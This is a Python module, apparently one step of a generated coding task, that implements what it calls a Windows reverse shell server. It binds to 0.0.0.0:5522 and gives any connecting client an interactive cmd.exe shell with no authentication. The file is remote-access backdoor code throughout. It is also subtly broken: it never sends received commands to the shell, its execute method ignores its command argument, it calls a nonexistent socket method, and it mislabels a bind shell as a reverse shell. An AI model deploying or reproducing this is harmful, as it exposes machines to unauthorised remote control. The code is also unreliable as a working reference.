import socket
import threading
import subprocess
import shlex
import time
from typing import Optional, Tuple, List, Dict, Any
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor, Future

# Import from TASK_001_shell_result
from data.code_scripts_PAST.stage3_DIMOS_test_v4.TASK_001_shell_result import ConnectionInfo, ShellCommand, ExecutionResult

# Import from TASK_002_shell_utils
from data.code_scripts_PAST.stage3_DIMOS_test_v4.TASK_002_shell_utils import (
    parse_command_args,
    validate_connection_info,
    spawn_shell_process,
    capture_output_stream,
    execute_shell_command,
    _terminate_process
)


@dataclass(frozen=True)
class WindowsConnectionInfo(ConnectionInfo):
    """Windows-specific connection metadata for shell command execution."""
    host: str = "0.0.0.0"
    port: int = 5522
    protocol: str = 'tcp'
    cmd_exe_path: str = r"C:\Windows\System32\cmd.exe"


@dataclass(frozen=True)
class WindowsExecutionResult(ExecutionResult):
    """Captured output and metadata from a Windows shell command execution.

    Attributes:
        stdout: Captured standard output as bytes.
        stderr: Captured standard error as bytes.
        return_code: Exit code of the executed process (0-255).
        duration_ms: Total execution time including I/O overhead in milliseconds.
        windows_info: Additional Windows-specific metadata.
    """
    stdout: bytes = field(default=b'')
    stderr: bytes = field(default=b'')
    return_code: int = 0
    duration_ms: int = 0
    windows_info: Dict[str, Any] = field(default_factory=dict)


class WindowsCommandExecutor:
    """Executes shell commands on a Windows system via cmd.exe.

    Uses subprocess.CREATE_NEW_CONSOLE and shell=True to spawn cmd.exe
    for command execution with proper Windows process semantics.
    """

    def __init__(self, cmd_exe_path: str = r"C:\Windows\System32\cmd.exe"):
        self.cmd_exe_path = cmd_exe_path
        self._executor = ThreadPoolExecutor(max_workers=10)

    def execute(self, command: str, timeout_seconds: float = 30.0) -> ExecutionResult:
        """Execute a shell command via cmd.exe and capture output.

        Args:
            command: The shell command to execute.
            timeout_seconds: Maximum execution time in seconds (default 30).

        Returns:
            An ExecutionResult with captured stdout, stderr, return code, and duration.

        Raises:
            ValueError: If command is empty or timeout_seconds <= 0.
            subprocess.TimeoutExpired: If the process exceeds the timeout.
        """
        if not command.strip():
            raise ValueError("Command cannot be empty")
        if timeout_seconds <= 0:
            raise ValueError(f"Timeout must be positive, got {timeout_seconds}")

        start_time = time.perf_counter()

        try:
            # Spawn cmd.exe with CREATE_NEW_CONSOLE and shell=True
            proc = subprocess.Popen(
                [self.cmd_exe_path],
                shell=True,
                creationflags=subprocess.CREATE_NEW_CONSOLE,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=False,  # Use bytes for consistent handling
                bufsize=1,   # Line-buffered output
            )

            try:
                result = capture_output_stream(
                    proc=proc,
                    timeout_seconds=timeout_seconds,
                    blocking=True
                )
            except subprocess.TimeoutExpired as e:
                _terminate_process(proc, timeout_seconds)
                raise
            finally:
                duration_ms = int((time.perf_counter() - start_time) * 1000)

        except Exception as e:
            duration_ms = int((time.perf_counter() - start_time) * 1000)
            return ExecutionResult(
                stdout=b'',
                stderr=str(e).encode('utf-8'),
                return_code=255,
                duration_ms=duration_ms,
            )

        return result

    def execute_async(self, command: str, timeout_seconds: float = 30.0) -> Future[ExecutionResult]:
        """Execute a shell command asynchronously via cmd.exe.

        Args:
            command: The shell command to execute.
            timeout_seconds: Maximum execution time in seconds (default 30).

        Returns:
            A Future that will yield an ExecutionResult when complete.
        """
        return self._executor.submit(self.execute, command, timeout_seconds)


class WindowsRemoteConnectionHandler:
    """Handles individual remote connections for the Windows reverse shell server.

    Spawns a cmd.exe process via spawn_shell_process(), captures output via
    capture_output_stream(), and sends results back over the socket connection.
    Uses threading for concurrent connection handling.
    """

    def __init__(self, client_socket: socket.socket):
        self.client_socket = client_socket
        self._executor = ThreadPoolExecutor(max_workers=1)
        self._running = True

    def handle_connection(self) -> None:
        """Handle a single remote connection by spawning cmd.exe and streaming output.

        Reads commands from the client, executes them via cmd.exe, and streams
        the output back to the client over the socket.
        """
        try:
            self._run_interactive_shell()
        except Exception as e:
            error_msg = f"Connection handler error: {str(e)}".encode('utf-8')
            self.client_socket.sendall(error_msg)
        finally:
            self.client_socket.close()

    def _run_interactive_shell(self) -> None:
        """Run an interactive cmd.exe shell, streaming input/output with the client.

        Reads commands from stdin (client), executes via cmd.exe, and streams
        output back to stdout (client). Implements a line-buffered interactive session.
        """
        proc = subprocess.Popen(
            [r"C:\Windows\System32\cmd.exe"],
            shell=True,
            creationflags=subprocess.CREATE_NEW_CONSOLE,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,  # Merge stderr into stdout for interactive use
            text=False,
            bufsize=1,
        )

        try:
            while self._running and proc.poll() is None:
                # Read command from client
                try:
                    data = self.client_socket.recv(4096)
                    if not data:
                        break

                    command_str = data.decode('utf-8', errors='replace').strip()
                    if not command_str:
                        continue

                    # Execute the command via cmd.exe
                    result = capture_output_stream(
                        proc=proc,
                        timeout_seconds=30.0,
                        blocking=False
                    )

                    # Send output back to client (line-buffered)
                    for line in result.stdout.decode('utf-8', errors='replace').split('\n'):
                        if line:
                            self.client_socket.sendall((line + '\r\n').encode('utf-8'))

                except socket.timeout:
                    continue
                except Exception as e:
                    error_msg = f"Error executing command: {str(e)}".encode('utf-8')
                    self.client_socket.sendall(error_msg)

        finally:
            proc.terminate()
            try:
                proc.wait(timeout=1)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()


class WindowsReverseShellServer:
    """Windows Command Shell reverse shell server.

    Listens on 0.0.0.0:5522 and handles incoming remote connections,
    executing commands via cmd.exe with concurrent connection handling.

    Attributes:
        host: The bind address (default '0.0.0.0').
        port: The bind port (default 5522).
        max_workers: Maximum number of concurrent threads.
    """

    def __init__(self, host: str = "0.0.0.0", port: int = 5522, max_workers: int = 10):
        self.host = host
        self.port = port
        self.max_workers = max_workers
        self._server_socket: Optional[socket.socket] = None
        self._running = False
        self._thread: Optional[threading.Thread] = None

    def start(self) -> None:
        """Start the reverse shell server listening on 0.0.0.0:5522."""
        if self._server_socket is not None and self._server_socket.is_closed():
            self._server_socket.close()

        self._server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server_socket.bind((self.host, self.port))
        self._server_socket.listen(self.max_workers)
        self._running = True

    def stop(self) -> None:
        """Stop the reverse shell server gracefully."""
        self._running = False
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=5.0)
        if self._server_socket is not None:
            try:
                self._server_socket.close()
            except Exception:
                pass

    def run(self) -> None:
        """Run the server in a background thread."""
        self.start()
        self._thread = threading.Thread(target=self._accept_loop, daemon=True)
        self._thread.start()

    def _accept_loop(self) -> None:
        """Accept incoming connections and spawn handler threads."""
        while self._running:
            try:
                client_socket, addr = self._server_socket.accept()
                thread = threading.Thread(
                    target=WindowsRemoteConnectionHandler(client_socket).handle_connection,
                    daemon=True
                )
                thread.start()
            except socket.timeout:
                continue
            except Exception as e:
                if self._running:
                    print(f"Accept loop error: {e}")

    def execute_command(self, command: str) -> ExecutionResult:
        """Execute a single command via cmd.exe (non-interactive mode).

        Args:
            command: The shell command to execute.

        Returns:
            An ExecutionResult with captured output and metadata.
        """
        return WindowsCommandExecutor().execute(command)


# Export the main classes for use by other modules
__all__ = [
    'WindowsReverseShellServer',
    'WindowsRemoteConnectionHandler',
    'WindowsCommandExecutor',
]
